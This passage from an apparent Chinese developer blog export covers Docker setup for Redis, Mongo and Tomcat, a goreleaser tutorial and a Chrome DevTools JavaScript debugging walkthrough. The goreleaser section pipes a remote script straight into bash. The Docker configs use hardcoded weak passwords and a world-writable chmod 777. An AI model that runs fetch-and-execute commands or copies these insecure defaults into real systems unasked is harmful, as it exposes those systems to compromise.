2.4s</span><br><span class="line"> =&gt; =&gt; extracting sha256:412caad352a3ecbb29c080379407ae0761e7b9b454f7239cbfd1d1da25e06b29                                                                                                                                                                                                                          0.2s</span><br><span class="line"> =&gt; =&gt; extracting sha256:e6d3e61f7a504fa66d7275123969e9917570188650eb84b2280a726b996040f6                                                                                                                                                                                                                          0.3s</span><br><span class="line"> =&gt; =&gt; sha256:8ed70148ebcf78cba8546f5af3e152a6d9422a3a9d814d7683242e4663e773c3 106.07MB / 106.07MB                                                                                                                                                                                                               130.7s</span><br><span class="line"> =&gt; =&gt; extracting sha256:461bb1d8c517c7f9fc0f1df66c9dc34c85a23421c1e1c540b2e28cbb258e75f5                                                                                                                                                                                                                          3.6s</span><br><span class="line"> =&gt; =&gt; extracting sha256:e442ee9d8dd9896a5b3b67117060f2af4ae8e997af7297009e7d0ea4b6595163                                                                                                                                                                                                                          0.3s</span><br><span class="line"> =&gt; =&gt; extracting sha256:36b5bcea956cbbcc7e16356354d5eb4b5b3834a43d708ca6c3fd048f33ddc579                                                                                                                                                                                                                          0.0s</span><br><span class="line"> =&gt; =&gt; extracting sha256:8ed70148ebcf78cba8546f5af3e152a6d9422a3a9d814d7683242e4663e773c3                                                                                                                                                                                                                          3.1s</span><br><span class="line"> =&gt; [auth] library/openjdk:pull token <span class="keyword">for</span> registry-1.docker.io                                                                                                                                                                                                                                                     0.0s</span><br><span class="line"> =&gt; [2/3] ADD ./target/dockerdemo-0.0.1-SNAPSHOT.jar app.jar                                                                                                                                                                                                                                                       0.2s</span><br><span class="line"> =&gt; [3/3] RUN bash -c <span class="string">&#x27;touch /app.jar&#x27;</span>                                                                                                                                                                                                                                                                             0.4s</span><br><span class="line"> =&gt; exporting to image                                                                                                                                                                                                                                                                                             0.1s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                                                                                                                                                                                                                                                            0.1s</span><br><span class="line"> =&gt; =&gt; writing image sha256:25dd4796c1ce0e27a2cabf65c8029e605a563535ba6d6ed5ec77a97f25429051                                                                                                                                                                                                                       0.0s</span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/web:1.0</span><br></pre></td></tr></table></figure><p>简单解释  <code>java -Djava.security.egd=file:/dev/./urandom -jar app.jar</code><br>在运行的时候配置随机数生成，在一定程度上加快随机数生成。securerandom在java各种组件中使用广泛，可以可靠的产生随机数。但大量产生随机数的情况下，性能会较低。例如产生UUID的场景。</p><p>第一眼看到为什么是<code>/dev/./urandom</code> 而不是<code>/dev/urandom</code> 呢，这是jdk的一个bug引起的(现在还有没有不清楚)<br>，参考文章：<a href="https://blog.csdn.net/Small_StarOne/article/details/102972211">https://blog.csdn.net/Small_StarOne&#x2F;article&#x2F;details&#x2F;102972211</a></p><h1 id="使用Docker搭建Redis"><a href="#使用Docker搭建Redis" class="headerlink" title="使用Docker搭建Redis"></a>使用Docker搭建Redis</h1><p>docker hub官方文档</p><p><a href="https://hub.docker.com/_/redis">Redis - Official Image | Docker Hub</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  -h redis \</span><br><span class="line">  -e REDIS_PASSWORD=redis \</span><br><span class="line">  -v redis-data:/data \</span><br><span class="line">  -p 7788:6379 \</span><br><span class="line">  --name redis \</span><br><span class="line">  --restart always \</span><br><span class="line">  redis:5.0.5-alpine3.9 /bin/sh -c <span class="string">&#x27;redis-server --appendonly yes --requirepass $&#123;REDIS_PASSWORD&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="使用Docker搭建Mongo"><a href="#使用Docker搭建Mongo" class="headerlink" title="使用Docker搭建Mongo"></a>使用Docker搭建Mongo</h1><p>docker hub官方文档</p><p><a href="https://hub.docker.com/_/mongo">Mongo - Official Image | Docker Hub</a></p><p><a href="https://github.com/docker-library/docs/blob/master/mongo/README.md#supported-tags-and-respective-dockerfile-links">docs&#x2F;README.md at master · docker-library&#x2F;docs</a></p><p><a href="https://stackoverflow.com/questions/42912755/how-to-create-a-db-for-mongodb-container-on-start-up">How to create a DB for MongoDB container on start up?</a></p><p>docker-compose.yml</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.8&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  mongodb:</span><br><span class="line">    image: mongo</span><br><span class="line">    hostname: mongodb</span><br><span class="line">    command: [--auth]</span><br><span class="line">    environment:</span><br><span class="line">      MONGO_INITDB_ROOT_USERNAME: root</span><br><span class="line">      MONGO_INITDB_ROOT_PASSWORD: password</span><br><span class="line">      MONGO_INITDB_DATABASE: database</span><br><span class="line">      MONGO_USERNAME: username</span><br><span class="line">      MONGO_PASSWORD: password</span><br><span class="line">    volumes:</span><br><span class="line">      - ./.docker/mongo_data:/data/db</span><br><span class="line">      - ./mongo-init.sh:/docker-<span class="keyword">entrypoint</span><span class="language-bash">-initdb.d/mongo-init.sh</span></span><br></pre></td></tr></table></figure><p>mongo-init.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mongo -- <span class="string">&quot;<span class="variable">$MONGO_INITDB_DATABASE</span>&quot;</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">db = db.getSiblingDB(&#x27;admin&#x27;)</span></span><br><span class="line"><span class="string">db.auth(&#x27;$MONGO_INITDB_ROOT_USERNAME&#x27;, &#x27;$MONGO_INITDB_ROOT_PASSWORD&#x27;)</span></span><br><span class="line"><span class="string">db = db.getSiblingDB(&#x27;$MONGO_INITDB_DATABASE&#x27;)</span></span><br><span class="line"><span class="string">db.createUser(&#123;</span></span><br><span class="line"><span class="string">  user: &quot;$MONGO_USERNAME&quot;,</span></span><br><span class="line"><span class="string">  pwd: &quot;$MONGO_PASSWORD&quot;,</span></span><br><span class="line"><span class="string">  roles: [</span></span><br><span class="line"><span class="string">  &#123; role: &#x27;readWrite&#x27;, db: &#x27;$MONGO_INITDB_DATABASE&#x27; &#125;</span></span><br><span class="line"><span class="string">  ]</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><h2 id="使用Docker部署Tomcat"><a href="#使用Docker部署Tomcat" class="headerlink" title="使用Docker部署Tomcat"></a>使用Docker部署Tomcat</h2><p>dockerfile</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> tomcat:<span class="number">8.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将webapp下的全部删除</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /usr/local/tomcat/webapps/* \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; useradd -ms /bin/bash tomcat \</span></span><br><span class="line"><span class="language-bash">&amp;&amp; <span class="built_in">chown</span> -R tomcat:tomcat /usr/local/tomcat/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 777 /usr/local/tomcat/bin/catalina.sh </span></span><br><span class="line"><span class="comment">#将target下的xx.war拷贝到/usr/local/tomcat/webapps/下</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> --<span class="built_in">chown</span>=tomcat ROOT.war /usr/local/tomcat/webapps/</span></span><br><span class="line"><span class="comment"># 设置启动用户</span></span><br><span class="line"><span class="keyword">USER</span> tomcat</span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /usr/local/tomcat</span></span><br><span class="line"><span class="comment">#端口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="comment">#设置启动命令</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/usr/local/tomcat/bin/catalina.sh&quot;</span>,<span class="string">&quot;run&quot;</span>]</span></span><br></pre></td></tr></table></figure><h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/v2.10.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h1 id="docker资源限制"><a href="#docker资源限制" class="headerlink" title="docker资源限制"></a>docker资源限制</h1><p>docker-compose.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">service:</span><br><span class="line">  image: nginx</span><br><span class="line">  mem_limit: 512M</span><br><span class="line">  mem_reservation: 128M</span><br><span class="line">  cpus: 0.5</span><br><span class="line">  ports:</span><br><span class="line">    - &quot;80:80&quot;</span><br></pre></td></tr></table></figure><h2 id="踩坑记录："><a href="#踩坑记录：" class="headerlink" title="踩坑记录："></a>踩坑记录：</h2><ol><li>docker</li><li></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/docker.service</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h1><ol><li>镜像分层</li><li></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 云原生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goreleaser 方便的go 二进制包分发工具</title>
      <link href="/2022/11/10/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
      <url>/2022/11/10/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用bash脚本进行安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sfL https://goreleaser.com/static/run | bash</span><br></pre></td></tr></table></figure><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>go语言是支持跨平台编译的，每次编译发布都手动操作太麻烦了，使用本工具可以在一次配置好后，每次发布时只要一条命令就可以编译发布了。</p><p>首先我们创建一个测试项目，然后编写一个main.go文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// main.go</span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  println(<span class="string">&quot;hello kaka&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go mod init main</span><br></pre></td></tr></table></figure><p>运行<a href="https://goreleaser.com/cmd/goreleaser_init/">init</a>命令以创建示例<code>.goreleaser.yaml</code> 以及<code>.gitignore</code>文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser init</span><br></pre></td></tr></table></figure><p>其中<code>.goreleaser.yaml</code> 是goreleaser发布相关配置，<code>.gitignore</code> 是设置git忽略的文件夹或文件</p><p>.goreleaser.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## This is an example .goreleaser.yml file with some sensible defaults.</span></span><br><span class="line"><span class="comment">## Make sure to check the documentation at https://goreleaser.com</span></span><br><span class="line"><span class="attr">before:</span></span><br><span class="line">  <span class="attr">hooks:</span></span><br><span class="line">    <span class="comment">## You may remove this if you don&#x27;t use go modules.</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">go</span> <span class="string">mod</span> <span class="string">tidy</span></span><br><span class="line">    <span class="comment">## you may remove this if you don&#x27;t need go generate</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">go</span> <span class="string">generate</span> <span class="string">./...</span></span><br><span class="line"><span class="attr">builds:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">env:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">CGO_ENABLED=0</span></span><br><span class="line">    <span class="attr">goos:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">linux</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">windows</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">darwin</span></span><br><span class="line"><span class="attr">archives:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">replacements:</span></span><br><span class="line">      <span class="attr">darwin:</span> <span class="string">Darwin</span></span><br><span class="line">      <span class="attr">linux:</span> <span class="string">Linux</span></span><br><span class="line">      <span class="attr">windows:</span> <span class="string">Windows</span></span><br><span class="line">      <span class="attr">386:</span> <span class="string">i386</span></span><br><span class="line">      <span class="attr">amd64:</span> <span class="string">x86_64</span></span><br><span class="line"><span class="attr">checksum:</span></span><br><span class="line">  <span class="attr">name_template:</span> <span class="string">&#x27;checksums.txt&#x27;</span></span><br><span class="line"><span class="attr">snapshot:</span></span><br><span class="line">  <span class="attr">name_template:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; incpatch .Version &#125;&#125;</span>-next&quot;</span></span><br><span class="line"><span class="attr">changelog:</span></span><br><span class="line">  <span class="attr">sort:</span> <span class="string">asc</span></span><br><span class="line">  <span class="attr">filters:</span></span><br><span class="line">    <span class="attr">exclude:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;^docs:&#x27;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;^test:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## modelines, feel free to remove those if you don&#x27;t want/use them:</span></span><br><span class="line"><span class="comment">## yaml-language-server: $schema=https://goreleaser.com/static/schema.json</span></span><br><span class="line"><span class="comment">## vim: set ts=2 sw=2 tw=0 fo=cnqoj</span></span><br></pre></td></tr></table></figure><p>.gitignore</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">dist/</span></span><br><span class="line"><span class="string">.idea/</span></span><br></pre></td></tr></table></figure><p>如果是在本地生成release，使用下面的命令即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser release --snapshot --rm-dist</span><br></pre></td></tr></table></figure><p>可以自定义.goreleaser.yaml ，并且使用命令去检查你的配置文件是否有错误</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser check</span><br></pre></td></tr></table></figure><p>也可以只从生成本地开发环境对应的release，例如在macos上使用此命令，只会生成macos版本的二进制文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser build --single-target</span><br></pre></td></tr></table></figure><h2 id="事先跑一下"><a href="#事先跑一下" class="headerlink" title="事先跑一下"></a>事先跑一下</h2><p>如果你想在真正发布以前测试下你的程序，可是使用以下的方法</p><p>只编译项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goreleaser build</span><br></pre></td></tr></table></figure><p>如果当前存在dist目录，可以手动删除dist，或者在命令中加入<code>—rm-dist</code>参数</p><p><img src="/../imgs/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7%20ce4effd525964ad489ac61519a128673/Untitled.png" alt="Untitled"></p><p>编译结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">☁  action [main] tree </span><br><span class="line">.</span><br><span class="line">├── README.md</span><br><span class="line">├── dist</span><br><span class="line">│   ├── CHANGELOG.md</span><br><span class="line">│   ├── action_darwin_amd64_v1</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_darwin_arm64</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_linux_386</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_linux_amd64_v1</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_linux_arm64</span><br><span class="line">│   │   └── action</span><br><span class="line">│   ├── action_windows_386</span><br><span class="line">│   │   └── action.exe</span><br><span class="line">│   ├── action_windows_amd64_v1</span><br><span class="line">│   │   └── action.exe</span><br><span class="line">│   ├── action_windows_arm64</span><br><span class="line">│   │   └── action.exe</span><br><span class="line">│   ├── artifacts.json</span><br><span class="line">│   ├── config.yaml</span><br><span class="line">│   └── metadata.json</span><br><span class="line">├── go.mod</span><br><span class="line">└── main.go</span><br></pre></td></tr></table></figure><h2 id="常见的使用场景"><a href="#常见的使用场景" class="headerlink" title="常见的使用场景"></a>常见的使用场景</h2><p>在修完bug后，测试并发布到release中</p><p>在commit代码并push后可以在IDE中，右键把这条打一个标签</p><p><img src="/../imgs/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7%20ce4effd525964ad489ac61519a128673/Untitled%201.png" alt="Untitled"></p><p><img src="/../imgs/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7%20ce4effd525964ad489ac61519a128673/Untitled%202.png" alt="Untitled"></p><p>最后使用命令进行发布</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">goreleaser</span> <span class="string">release</span> <span class="string">--rm-dist</span></span><br></pre></td></tr></table></figure><h2 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a>最后效果</h2><p>发布并且会有更新日志，不同系统不同架构程序都会打包📦出来</p><p><img src="/../imgs/goreleaser%20%E6%96%B9%E4%BE%BF%E7%9A%84go%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8C%85%E5%88%86%E5%8F%91%E5%B7%A5%E5%85%B7%20ce4effd525964ad489ac61519a128673/Untitled%203.png" alt="Untitled"></p><h2 id="配合Action使用"><a href="#配合Action使用" class="headerlink" title="配合Action使用"></a>配合Action使用</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS Debug</title>
      <link href="/2022/08/17/JS%20Debug/"/>
      <url>/2022/08/17/JS%20Debug/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Bug复现"><a href="#1-Bug复现" class="headerlink" title="1. Bug复现"></a>1. Bug复现</h2><p>复现是调试的第一步。此处使用的是chrome提供的官方环境</p><p><a href="https://googlechrome.github.io/devtools-samples/debug-js/get-started">Demo: Get Started Debugging JavaScript with Chrome DevTools</a></p><ol><li>在一个新的标签页打开demo</li></ol><p><img src="/../imgs/JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34/Untitled.png" alt="Untitled"></p><ol><li>输入数字，计算结果，获得的结果并不对，不是数字相加，而是字符串相加，这时bug就出现啦。也就是你要修复的点。</li></ol><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 1.png)</p><h2 id="2-熟悉Sources"><a href="#2-熟悉Sources" class="headerlink" title="2. 熟悉Sources"></a>2. 熟悉Sources</h2><p>DevTools为不同的任务提供了许多不同的工具，例如更改CSS、分析页面加载性能和监控网络请求。Sources面板是调试JavaScript的地方。</p><ol><li><p>通过快捷键 command+option+i 打开Console面板</p><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 2.png)</p></li><li><p>点击Souce标签</p><p>Sources面板有三个部分</p><ul><li>文件导航面板，在这里你将会看到页面中所有请求的文件</li><li>代码编辑器，在文件导航面板中选择文件后，文件的内容将会展示</li><li>JavaScript 调试器，用于检测JavaScript的各种功能工具</li></ul></li></ol><h2 id="3-使用断点暂停代码"><a href="#3-使用断点暂停代码" class="headerlink" title="3. 使用断点暂停代码"></a>3. 使用断点暂停代码</h2><p>解决这类问题常见的调试方法就是在代码中插入<code>console.log()</code></p><p>例子：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">updateLabel</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> addend1 = <span class="title function_">getNumber1</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;addend1:&#x27;</span>, addend1);</span><br><span class="line">    <span class="keyword">var</span> addend2 = <span class="title function_">getNumber2</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;addend2:&#x27;</span>, addend2);</span><br><span class="line">    <span class="keyword">var</span> sum = addend1 + addend2;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;sum:&#x27;</span>, sum);</span><br><span class="line">    label.<span class="property">textContent</span> = addend1 + <span class="string">&#x27; + &#x27;</span> + addend2 + <span class="string">&#x27; = &#x27;</span> + sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>console.log()<br>方法可以解决这类问题，但是断点可以更快地完成这项工作。断点允许您在代码执行过程中暂停代码，并及时检查该时刻的所有值。与console.log()<br>方法相比，断点有一下优势:</p><ul><li>使用<code>console. log()</code>，您需要手动打开源代码，找到相关的代码，插入<code>Console. log()</code><br>语句，然后重新加载页面，以便在Console中查看消息。使用断点，您可以暂停相关的代码，甚至不知道代码是如何构造的。</li><li>在<code>console.log()</code>语句中，需要显式指定要检查的每个值。有了断点，DevTools就会显示出当时所有变量的值。有时候，甚至都没有意识到一些变量会影响到了代码。</li></ul><p>简而言之，相比使用<code>console.log()</code> 方法，断点能够帮助你更快的找到并修复漏洞。</p><p>如果你想知道程是怎么运行的，你可以有根据的去猜测错误的计算是在click事件触发后计算出来的。因此，您可能希望在单击侦听器执行时暂停代码。事件侦听器断点可以让你做到这一点:</p><ol><li><p>在“JavaScript调试”面板中，单击“事件监听器断点”以展开该部分。DevTools显示了一个可扩展的事件类别列表，如动画和剪贴板。</p></li><li><p>在“鼠标”事件类别旁边，单击“展开”。DevTools显示了一个鼠标事件列表，比如点击和鼠标按下。每个事件旁边都有一个复选框。</p></li><li><p>选中click复选框。DevTools现在设置为当任何点击事件监听器执行时自动暂停。</p></li><li><p>返回demo，再次单击Add Number 1和Number<br>2。DevTools暂停演示并突出显示源代码面板中的一行代码。DevTools应该在这行代码中暂停:</p> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onClick</span>(<span class="params"></span>) &#123;</span><br></pre></td></tr></table></figure><p>如果你暂停到了不是这行代码，可以点击继续执行脚本按钮，直到暂停这行代码。</p><p>注意，如果你浏览器有插件可能注册了<code>click</code>事件，调试的过程中可能暂停在了插件的<code>click</code>监听器，你可以使用隐私模式来访网页</p></li></ol><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 5.png)</p><p>事件监听器断点只是DevTools中许多类型的断点之一。记住所有不同的类型是值得的，因为每种类型最终都会帮助您尽可能快地调试不同的场景。请参阅<a href="https://developer.chrome.com/docs/devtools/javascript/breakpoints/">暂停使用断点的代码</a><br>，以了解何时以及如何使用每种类型。</p><h2 id="4-逐步调试代码"><a href="#4-逐步调试代码" class="headerlink" title="4. 逐步调试代码"></a>4. 逐步调试代码</h2><p>bug的一个常见原因是脚本以错误的顺序执行。您能够逐行检查代码的执行，每次一行，并准确地找出它在哪里以与您预期不同的顺序执行。</p><ol><li><p>在DevTools的source面板上，单击Step into next函数调用Step into next函数调用来逐步执行<code>onClick()</code><br>函数，一次一行。DevTools突出显示了以下一行代码:</p> <figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">inputsAreEmpty</span>()) &#123;</span><br></pre></td></tr></table></figure></li><li><p>单击下一步函数调用的步骤。DevTools执行<code>inputsAreEmpty()</code>而不进入它。注意，DevTools跳过了几行代码。这是因为<br><code>inputsAreEmpty()</code>的计算结果为false，因此if语句的代码块没有执行。</p></li></ol><h2 id="5-设置代码行断点"><a href="#5-设置代码行断点" class="headerlink" title="5. 设置代码行断点"></a>5. 设置代码行断点</h2><p>代码行中断点是最常见的中断点类型。当你想暂停某一行代码时，可以使用代码行断点。</p><ol><li>看updateLabel()中的最后一行代码。</li><li>在代码的左边，你可以看到这一行代码的行号，是32。点击32。DevTools在32的上面放了一个蓝色图标。这意味着在这一行有一个代码行的断点。DevTools现在总是在执行这行代码之前暂停。</li><li>点击恢复脚本的执行 恢复脚本的执行。脚本继续执行，直到它到达第32行。在第29、30和31行，DevTools打印出addend1、addend2的值，以及每行分号右边的sum。</li></ol><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 6.png)</p><h2 id="6-检查变量值"><a href="#6-检查变量值" class="headerlink" title="6. 检查变量值"></a>6. 检查变量值</h2><p><code>addend1</code>、<code>addend2</code>和<code>sum</code>的值看起来很可疑。它们被引号包裹着，这意味着它们是字符串。这是一个很好的假设，可以解释错误的原因。现在是时候收集更多的信息了。DevTools提供了很多检查变量值的工具。</p><h3 id="方法一：作用域面板"><a href="#方法一：作用域面板" class="headerlink" title="方法一：作用域面板"></a>方法一：作用域面板</h3><p>![Untitled](..&#x2F;imgs&#x2F;JS%20Debug%2013be7c086b3080b395e3f8c62af5dd34&#x2F;Untitled 7.png)</p><h2 id="案例：chinaz-com"><a href="#案例：chinaz-com" class="headerlink" 